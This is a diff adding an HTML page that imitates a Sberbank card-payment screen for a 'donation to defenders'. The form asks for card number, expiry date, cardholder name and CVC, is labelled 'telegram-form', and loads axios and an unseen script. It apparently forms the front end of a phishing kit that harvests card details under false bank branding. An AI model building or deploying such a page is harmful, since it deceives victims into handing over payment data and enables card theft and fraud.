@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" type="text/css" href="css/style.css">
+	<link rel="stylesheet" type="text/css" href="css/normalize.css">
+	<title>Donation</title>
+</head>
+
+<body>
+	<div class="wraper">
+		<header>
+			<img class="SberHeader" src="./img/sberbank-3.svg" alt="" srcset="">
+			<p>
+				Cумма пожертвования:</br>
+				Номер заказа: </br><!-- прикрутити рандом-->
+				Описание: донат защитникам
+			</p>
+		</header>
+		<main>
+			<div class="donationCart">
+				<div class="mainWraper">
+					<div class="leftColum">
+
+						<p>Номер карти:</p>
+						<p>дійсна до:</p>
+						<p>имя держателя карти:</p>
+						<p class="CVC">CVC2/CVV2</p>
+
+					</div>
+					<div class="rightColum">
+						<form class="telegram-form">
+							<div class="card"><input type="number" class="i1" name="nomerCredit" maxlength="5"
+									placeholder="0000 0000 0000 0000"> <img class="cardI"
+									src="./img/icons8-mastercard-credit-card-80.png" alt="" srcset=""></div>
+							<div><input class="imputShort" type="number" name="MM" maxlength="2" placeholder="MM"> /
+								<input class="imputShort" type="number" name="Rik" placeholder="ГГ">
+							</div>
+							<div class="FullNametext"><input class="FullNametextInput" type="text" name="FullName"
+									placeholder="ИМЯ ФАМИЛИЯ ЛАТИНИЦЕЙ"></div>
+							<div class="inputSmall"><input class="FullNametextInput" type="text" name="FullName2"
+									placeholder="ИМЯ ФАМИЛИЯ"></div>
+							<div class="CVC"><input type="password" name="CVC" maxlength="3" placeholder="***"></div>
+
+					</div>
+					<div class="mainFooter">
+						<div><input type="checkbox" name="sd" id="sd">send notification on email</input></div>
+						<button class="btn" type="submit">отправить</button>
+						</form>
+					</div>
+				</div>
+
+			</div>
+		</main>
+		<footer>
+			<img class="imgFooter" src="./img/visa.svg" alt="" srcset="">
+			<img class="imgFooter" src="./img/masterpass-1.svg" alt="" srcset="">
+			<img class="imgFooter" src="./img/mastercard-6.svg" alt="" srcset="">
+
+		</footer>
+
+	</div>
+	<!--<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>-->
+	<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+	<script src="js/main.js"></script>
+</body>
+
+</html>
